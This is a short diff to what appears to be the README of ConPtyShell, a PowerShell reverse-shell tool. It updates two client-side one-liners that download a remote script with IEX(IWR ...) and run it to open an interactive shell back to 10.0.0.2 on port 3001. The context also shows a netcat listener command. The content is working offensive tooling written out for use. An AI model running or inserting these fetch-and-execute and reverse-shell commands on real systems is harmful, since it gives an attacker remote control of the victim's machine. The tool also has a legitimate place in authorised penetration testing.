@@ -35,7 +35,7 @@ stty raw -echo; (stty size; cat) | nc -lvnp 3001
 ##### Client Side:
 
 ```
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell 10.0.0.2 3001
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
 or, if you upload the ps1:
@@ -59,7 +59,7 @@ fg[ENTER]
 ##### Client Side:
 Here you should use the values read from ```stty size``` command in the Parameters -Rows and -Cols
 ```
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
 ```
 
 or, if you upload the ps1:
